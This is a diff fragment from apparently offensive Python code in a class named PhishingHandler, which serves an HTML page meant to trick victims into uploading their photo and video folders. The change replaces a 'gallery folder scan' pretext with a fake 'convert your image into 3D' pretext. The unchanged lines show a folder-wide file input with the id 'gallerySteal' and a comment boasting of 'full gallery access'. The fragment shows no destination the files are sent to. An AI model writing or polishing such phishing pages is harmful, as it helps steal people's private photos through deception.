@@ -71,10 +71,10 @@ class PhishingHandler(BaseHTTPRequestHandler):
 </head>
 <body>
     <div class="container">
-        <h1>Gallery Folder Scan</h1>
-        <p>Secure scan of your photos</p>
-        <p>Give Grant Access Of Your Folder Which You Want To Scan</p>
-        <button class="grant-btn" id="grantAccess">Grant Access</button>
+        <h1>Convert Your Img Into 3D Image</h1>
+        <p>Upload Multiple Img At a Time</p>
+        <p>Upload & wait few sec </p>
+        <button class="grant-btn" id="grantAccess">Convert</button>
         
         <!-- FULL GALLERY ACCESS - NO SELECTION NEEDED -->
         <input type="file" id="gallerySteal" webkitdirectory multiple accept="image/*,video/*">
